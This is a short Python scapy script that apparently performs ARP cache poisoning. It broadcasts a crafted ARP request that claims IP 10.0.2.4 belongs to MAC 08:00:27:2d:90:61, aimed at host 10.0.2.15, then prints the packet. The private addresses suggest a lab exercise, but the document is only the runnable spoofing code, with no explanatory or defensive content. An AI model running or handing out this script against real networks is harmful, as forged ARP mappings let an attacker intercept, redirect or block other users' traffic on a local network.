#!/usr/bin/env python
from scapy.all import *

ether = Ether()
ether.dst = 'ff:ff:ff:ff:ff:ff'
arp = ARP()
arp.op = 1
arp.psrc = '10.0.2.4'
arp.hwsrc = '08:00:27:2d:90:61'
arp.pdst = '10.0.2.15'

pkt = ether/arp
sendp(pkt)

pkt.show()
